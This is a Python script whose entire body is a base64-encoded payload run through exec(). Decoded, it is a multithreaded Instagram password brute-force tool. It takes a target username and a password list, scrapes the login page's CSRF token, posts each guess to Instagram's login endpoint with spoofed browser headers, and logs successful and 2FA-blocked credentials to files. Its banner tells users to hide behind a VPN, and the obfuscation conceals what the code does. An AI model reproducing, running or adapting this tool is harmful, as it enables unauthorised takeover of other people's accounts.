# Obfuscated by Mr.X
import base64
exec(base64.b64decode('ZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCBhYnNvbHV0ZV9pbXBvcnQKZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCBwcmludF9mdW5jdGlvbgppbXBvcnQgcmVxdWVzdHMsIHN5cywgdGhyZWFkaW5nLCB0aW1lLCBvcywgcmFuZG9tCmZyb20gcmFuZG9tIGltcG9ydCByYW5kaW50CmZyb20gc2l4Lm1vdmVzIGltcG9ydCBpbnB1dApDaGVja1ZlcnNpb24gPSBzdHIoc3lzLnZlcnNpb24pCmltcG9ydCByZQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQoKIyBGdW5nc2kgd2FybmEgQ3liZXJwdW5rIE5lb24KZGVmIG5lb24odGV4dCwgY29sb3I9J3B1cnBsZScpOgogICAgY29sb3JzID0gewogICAgICAgICdwdXJwbGUnOiAnXDAzM1szODsyOzE0ODswOzIxMW0nLAogICAgICAgICdwaW5rJzogJ1wwMzNbMzg7MjsyNTU7MjA7MTQ3bScsCiAgICAgICAgJ2N5YW4nOiAnXDAzM1szODsyOzA7MjU1OzI1NW0nLAogICAgICAgICdncmVlbic6ICdcMDMzWzM4OzI7NTc7MjU1OzIwbScsCiAgICAgICAgJ2JsdWUnOiAnXDAzM1szODsyOzMwOzE0NDsyNTVtJywKICAgICAgICAncmVzZXQnOiAnXDAzM1swbScKICAgIH0KICAgIHJldHVybiBmIntjb2xvcnMuZ2V0KGNvbG9yLCBjb2xvcnNbJ3B1cnBsZSddKX17dGV4dH17Y29sb3JzWydyZXNldCddfSIKCmRlZiBnbGl0Y2hfcHJpbnQodGV4dCwgZGVsYXk9MC4wMik6CiAgICBmb3IgY2hhciBpbiB0ZXh0OgogICAgICAgIHByaW50KG5lb24oY2hhciwgJ3B1cnBsZScpLCBlbmQ9JycsIGZsdXNoPVRydWUpCiAgICAgICAgdGltZS5zbGVlcChkZWxheSkKICAgIHByaW50KCkKCiMgSGVhZGVyIEN5YmVycHVuayBOZW9uCmhlYWRlciA9ICcnJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLi4uLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgTCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRjMgICRyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgJCQkJC5lJCIgIC4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAiJCQkJCQiICAgIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgKGluc3RhIGJydXRlIGZvcmNlKSAgICAgJCQkJGMgIC8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAuICAgICAgICAgICAgICAgICAgICQkJCQkJCRQICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgLiJjICAgICAgICAgICAgICAgICAgICAgICQkJCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIC4kYzNiICAgICAgICAgICAgICAgICAgLi5KJCQkJCRlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgNCQkJCQgICAgICAgICAgICAgLiQkJCQkJCQkJCQkJCQkYyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgJCQkJGIgICAgICAgICAgIC4kJCQkJCQkJCQkJCQkJCQkciAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAkJCQuICAgICAgICAuJCQkJCQkJCQkJCQkJCQkJCQkICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAkJCRjICAgICAgLiQkJCQkJCQgICIkJCQkJCQkJCRyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoKCicnJwoKbG9nb19saW5lcyA9IGhlYWRlci5zcGxpdGxpbmVzKCkKZm9yIGxpbmUgaW4gbG9nb19saW5lczoKICAgIGdsaXRjaF9wcmludChsaW5lLCBkZWxheT0wLjAxKQoKcHJpbnQobmVvbignQXV0aG9yICAgOiBNci5YJywgJ2N5YW4nKSkKcHJpbnQobmVvbignWVQgICAgICAgOiB3aG9tcng2NjYnLCAnY3lhbicpKQpwcmludChuZW9uKCdHaXRIdWIgICA6IGh0dHBzOi8vZ2l0aHViLmNvbS9XaG9tcng2NjYnLCAnY3lhbicpKQpwcmludChuZW9uKCdXZWJzaXRlICA6IGh0dHBzOi8vd2hvbXJ4LnBhZ2VzLmRldicsICdjeWFuJykpCnByaW50KG5lb24oJ1xu4pqg77iPICBNYW5hZ2VtZW50IGRlcGVuZHMgb24gVlBOIHNvZnR3YXJlLiBQbGVhc2UgdXNlIGl0IGJlZm9yZSBydW5uaW5nIHRoZSB0b29sIOKaoO+4j1xuJywgJ3BpbmsnKSkKCnByaW50KG5lb24oJyIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIicsICdwdXJwbGUnKSkKCgpjbGFzcyBJbnN0YUJydXRlKG9iamVjdCk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1c2VyID0gaW5wdXQobmVvbigndXNlcm5hbWUgOiAnLCAnY3lhbicpKQogICAgICAgICAgICBDb21ibyA9IGlucHV0KG5lb24oJ3Bhc3NMaXN0IDogJywgJ2N5YW4nKSkKICAgICAgICAgICAgcHJpbnQobmVvbignXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJywgJ3B1cnBsZScpKQogICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICAgICAgcHJpbnQobmVvbignXG5bIV0gVGhlIHRvb2wgd2FzIGludGVycnVwdGVkLiBFeGl0aW5nLi4uJywgJ3BpbmsnKSkKICAgICAgICAgICAgc3lzLmV4aXQoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQobmVvbihmJ1shXSBFcnJvcjoge2V9JywgJ3BpbmsnKSkKICAgICAgICAgICAgc3lzLmV4aXQoKQoKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoQ29tYm8pOgogICAgICAgICAgICBwcmludChuZW9uKCdbIV0gUGFzc3dvcmQgbGlzdCBub3QgZm91bmQhJywgJ3BpbmsnKSkKICAgICAgICAgICAgc3lzLmV4aXQoKQoKICAgICAgICB3aXRoIG9wZW4oQ29tYm8sICdyJywgZXJyb3JzPSdpZ25vcmUnKSBhcyB4OgogICAgICAgICAgICBDb21ib2xpc3QgPSB4LnJlYWQoKS5zcGxpdGxpbmVzKCkKCiAgICAgICAgdGhyZWFkID0gW10KICAgICAgICBmb3IgY29tYm8gaW4gQ29tYm9saXN0OgogICAgICAgICAgICBwYXNzd29yZCA9IGNvbWJvLnN0cmlwKCkKICAgICAgICAgICAgaWYgbm90IHBhc3N3b3JkOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgdCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuTmV3X0JyLCBhcmdzPSh1c2VyLCBwYXNzd29yZCkpCiAgICAgICAgICAgIHQuc3RhcnQoKQogICAgICAgICAgICB0aHJlYWQuYXBwZW5kKHQpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4zKSAgIyBLdXJhbmdpIGRlbGF5IGFnYXIgdGlkYWsgdGVybGFsdSBsYW1iYXQKICAgICAgICBmb3IgaiBpbiB0aHJlYWQ6CiAgICAgICAgICAgIGouam9pbigpCgogICAgZGVmIE5ld19CcihzZWxmLCB1c2VyLCBwd2QpOgogICAgICAgIGxpbmsgPSAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9hY2NvdW50cy9sb2dpbi8nCiAgICAgICAgbG9naW5fdXJsID0gJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vYWNjb3VudHMvbG9naW4vYWpheC8nCgogICAgICAgIHRpbWVfdmFsID0gaW50KGRhdGV0aW1lLm5vdygpLnRpbWVzdGFtcCgpKQogICAgICAgIHBheWxvYWQgPSB7CiAgICAgICAgICAgICd1c2VybmFtZSc6IHVzZXIsCiAgICAgICAgICAgICdlbmNfcGFzc3dvcmQnOiBmJyNQV0RfSU5TVEFHUkFNX0JST1dTRVI6MDp7dGltZV92YWx9Ontwd2R9JywKICAgICAgICAgICAgJ3F1ZXJ5UGFyYW1zJzoge30sCiAgICAgICAgICAgICdvcHRJbnRvT25lVGFwJzogJ2ZhbHNlJwogICAgICAgIH0KCiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBzOgogICAgICAgICAgICAgICAgciA9IHMuZ2V0KGxpbmssIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBjc3JmX21hdGNoID0gcmUuc2VhcmNoKHInImNzcmZfdG9rZW4iOiIoLio/KSInLCByLnRleHQpCiAgICAgICAgICAgICAgICBpZiBub3QgY3NyZl9tYXRjaDoKICAgICAgICAgICAgICAgICAgICBwcmludChuZW9uKGYnWyFdIENTUkYgdG9rZW4gbm90IGZvdW5kIGZvciB7dXNlcn06e3B3ZH0nLCAncGluaycpKQogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgY3NyZiA9IGNzcmZfbWF0Y2guZ3JvdXAoMSkKCiAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTUuMC4wLjAgU2FmYXJpLzUzNy4zNiIsCiAgICAgICAgICAgICAgICAgICAgIlgtUmVxdWVzdGVkLVdpdGgiOiAiWE1MSHR0cFJlcXVlc3QiLAogICAgICAgICAgICAgICAgICAgICJSZWZlcmVyIjogImh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vYWNjb3VudHMvbG9naW4vIiwKICAgICAgICAgICAgICAgICAgICAieC1jc3JmdG9rZW4iOiBjc3JmCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgciA9IHMucG9zdChsb2dpbl91cmwsIGRhdGE9cGF5bG9hZCwgaGVhZGVycz1oZWFkZXJzLCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgYXR0ZW1wdCA9IGYne3VzZXJ9Ontwd2R9JwogICAgICAgICAgICAgICAgcHJpbnQobmVvbihmJ3thdHRlbXB0fVxuLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScsICdibHVlJykpCgogICAgICAgICAgICAgICAgaWYgJyJhdXRoZW50aWNhdGVkIjp0cnVlJyBpbiByLnRleHQ6CiAgICAgICAgICAgICAgICAgICAgbXNnID0gZid7YXR0ZW1wdH0gLT4gR29vZCBoYWNrJwogICAgICAgICAgICAgICAgICAgIHByaW50KG5lb24obXNnLCAnZ3JlZW4nKSkKICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ2dvb2QudHh0JywgJ2EnKSBhcyB4OgogICAgICAgICAgICAgICAgICAgICAgICB4LndyaXRlKGYne2F0dGVtcHR9XG4nKQogICAgICAgICAgICAgICAgZWxpZiAndHdvX2ZhY3Rvcl9yZXF1aXJlZCcgaW4gci50ZXh0OgogICAgICAgICAgICAgICAgICAgIG1zZyA9IGYne2F0dGVtcHR9IC0+IEdvb2QgKDJGQSByZXF1aXJlZCknCiAgICAgICAgICAgICAgICAgICAgcHJpbnQobmVvbihtc2csICdjeWFuJykpCiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdyZXN1bHRzX05lZWRWZXJmaXkudHh0JywgJ2EnKSBhcyB4OgogICAgICAgICAgICAgICAgICAgICAgICB4LndyaXRlKGYne2F0dGVtcHR9XG4nKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChuZW9uKGYne2F0dGVtcHR9IC0+IEZhaWxlZCcsICdwaW5rJykpCgogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQobmVvbihmJ1shXSBDb25uZWN0aW9uIGVycm9yIGZvciB7dXNlcn06e3B3ZH0gfCB7c3RyKGUpfScsICdwaW5rJykpCgoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIEluc3RhQnJ1dGUoKQ==').decode('utf-8'))
